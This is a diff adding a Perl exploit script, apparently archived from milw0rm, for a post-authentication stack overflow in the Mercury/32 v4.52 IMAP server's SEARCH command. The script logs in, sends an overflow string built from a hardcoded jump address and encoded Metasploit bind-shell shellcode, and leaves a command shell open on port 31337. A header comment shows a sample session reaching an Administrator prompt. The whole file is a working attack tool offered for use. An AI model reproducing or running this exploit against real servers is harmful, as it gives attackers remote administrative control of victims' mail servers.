@@ -1,0 +1,132 @@
+# Z:\Exp>mercury_SEARCH.pl 127.0.0.1 143 void ph4nt0m.org
+#    Mercury/32 v4.52 IMAPD SEARCH command Post-Auth Stack Overflow Exploit
+#                                          Found & Code by void# ph4nt0m.org
+# 
+# S: * OK mercury.ph4nt0m.org IMAP4rev1 Mercury/32 v4.52 server ready.
+# C: pst06 LOGIN void ph4nt0m.org
+# S: pst06 OK LOGIN completed.
+# C: pst06 SELECT INBOX
+# S: * 0 EXISTS
+# S: * 0 RECENT
+# S: * FLAGS (\Deleted \Draft \Seen \Answered)
+# S: * OK [UIDVALIDITY 1190225819] UID Validity
+# S: * OK [UIDNEXT 1] Predicted next UID
+# S: * OK [PERMANENTFLAGS (\Deleted \Draft \Seen \Answered)] Settable message flag
+# s
+# S: pst06 OK [READ-WRITE] SELECT completed.
+# [*] Send Evil Payload ...
+# [+] Done! Check out cmdshell@127.0.0.1:31337. Good Luck  :-P 
+# 
+# Z:\Exp>nc -vv 127.0.0.1 31337
+# DNS fwd/rev mismatch: localhost != GNU
+# localhost [127.0.0.1] 31337 (?) open
+# Microsoft Windows XP [°æ±¾ 5.1.2600]
+# (C) °æÈ¨ËùÓÐ 1985-2001 Microsoft Corp.
+# 
+# e:\MERCURY>whoami
+# whoami
+# Administrator
+# 
+# e:\MERCURY>
+
+use strict;
+use warnings;
+use IO::Socket;
+
+# Target IP
+my $imap_host = shift || 127.0.0.1;
+my $imap_port = shift || 143;
+my $imap_user = shift || "void";
+my $imap_pass = shift || "ph4nt0m.org";
+
+my $banner = 
+"   Mercury/32 v4.52 IMAPD SEARCH command Post-Auth Stack Overflow Exploit\n".
+"                                         Found & Code by void#ph4nt0m.org\n".
+"\n";
+
+my $cheers = "Celebrate_the_6th_anniversary_of_the_founding_of_Ph4nt0m.org";
+my $jmpesp = "\x12\x45\xfa\x7f"; # Windows 2000/xp/2003 CHS Universe
+
+# /* win32_bind -  EXITFUNC=thread LPORT=31337 Size=347 Encoder=Pex http://metasploit.com */
+# bad char: 0x00 0x0A 0x0D 0x20 0x29 
+my $shellcode =
+"\x31\xc9\x81\xe9\xb0\xff\xff\xff\xe8\xff\xff\xff\xff\xc0\x5e\x81".
+"\x76\x0e\xfa\xd1\xa5\x6f\x83\xee\xfc\xe2\xf4\x06\xbb\x4e\x22\x12".
+"\x28\x5a\x90\x05\xb1\x2e\x03\xde\xf5\x2e\x2a\xc6\x5a\xd9\x6a\x82".
+"\xd0\x4a\xe4\xb5\xc9\x2e\x30\xda\xd0\x4e\x26\x71\xe5\x2e\x6e\x14".
+"\xe0\x65\xf6\x56\x55\x65\x1b\xfd\x10\x6f\x62\xfb\x13\x4e\x9b\xc1".
+"\x85\x81\x47\x8f\x34\x2e\x30\xde\xd0\x4e\x09\x71\xdd\xee\xe4\xa5".
+"\xcd\xa4\x84\xf9\xfd\x2e\xe6\x96\xf5\xb9\x0e\x39\xe0\x7e\x0b\x71".
+"\x92\x95\xe4\xba\xdd\x2e\x1f\xe6\x7c\x2e\x2f\xf2\x8f\xcd\xe1\xb4".
+"\xdf\x49\x3f\x05\x07\xc3\x3c\x9c\xb9\x96\x5d\x92\xa6\xd6\x5d\xa5".
+"\x85\x5a\xbf\x92\x1a\x48\x93\xc1\x81\x5a\xb9\xa5\x58\x40\x09\x7b".
+"\x3c\xad\x6d\xaf\xbb\xa7\x90\x2a\xb9\x7c\x66\x0f\x7c\xf2\x90\x2c".
+"\x82\xf6\x3c\xa9\x82\xe6\x3c\xb9\x82\x5a\xbf\x9c\xb9\xdf\x06\x9c".
+"\x82\x2c\x8e\x6f\xb9\x01\x75\x8a\x16\xf2\x90\x2c\xbb\xb5\x3e\xaf".
+"\x2e\x75\x07\x5e\x7c\x8b\x86\xad\x2e\x73\x3c\xaf\x2e\x75\x07\x1f".
+"\x98\x23\x26\xad\x2e\x73\x3f\xae\x85\xf0\x90\x2a\x42\xcd\x88\x83".
+"\x17\xdc\x38\x05\x07\xf0\x90\x2a\xb7\xcf\x0b\x9c\xb9\xc6\x02\x73".
+"\x34\xcf\x3f\xa3\xf8\x69\xe6\x1d\xbb\xe1\xe6\x18\xe0\x65\x9c\x50".
+"\x2f\xe7\x42\x04\x93\x89\xfc\x77\xab\x9d\xc4\x51\x7a\xcd\x1d\x04".
+"\x62\xb3\x90\x8f\x95\x5a\xb9\xa1\x86\xf7\x3e\xab\x80\xcf\x6e\xab".
+"\x80\xf0\x3e\x05\x01\xcd\xc2\x23\xd4\x6b\x3c\x05\x07\xcf\x90\x05".
+"\xe6\x5a\xbf\x71\x86\x59\xec\x3e\xb5\x5a\xb9\xa8\x2e\x75\x07\x15".
+"\x1f\x45\x0f\xa9\x2e\x73\x90\x2a\xd1\xa5\x6f";
+
+
+
+print $banner;
+sleep(1);
+
+my $sock = IO::Socket::INET->new( PeerHost=>$imap_host, PeerPort=>$imap_port, proto=>"tcp" ) or die "Connect error.\n";
+imap_recv("");
+
+imap_send("pst06 LOGIN $imap_user $imap_pass\r\n", "rv");
+imap_send("pst06 SELECT INBOX\r\n", "rv");
+
+my $payload = $cheers.$jmpesp.$shellcode;
+print "[*] Send Evil Payload ...\n";
+imap_send("pst06 SEARCH ON $payload\r\n", "");
+sleep(1);
+print "[+] Done! Check out cmdshell\@$imap_host:31337. Good Luck :-P\n";
+$sock->close();
+
+
+sub imap_send
+{
+	if($_[1] =~ /v/)
+	{
+		if(length($_[0])<=75)
+		{
+			print "C: ".$_[0];
+		}
+		else
+		{
+			print "C: ".substr($_[0], 0, 36)." ... ".substr($_[0], -36, -1)."\n";
+		}
+	}
+
+	print $sock $_[0];
+
+	if($_[1] =~ /r/)
+	{	
+		imap_recv(substr($_[0], 0, index($_[0], " ")+1));
+	}
+}
+
+
+sub imap_recv
+{
+	while(<$sock>)
+	{
+		print "S: ".$_;
+		if($_ =~ /$_[0]OK/)
+		{	last;	}
+		elsif($_ =~ /$_[0]NO|$_[0]BAD/ )
+		{	last;	}
+		else
+		{	next;	}
+	}
+}
+
+# milw0rm.com [2007-09-19]
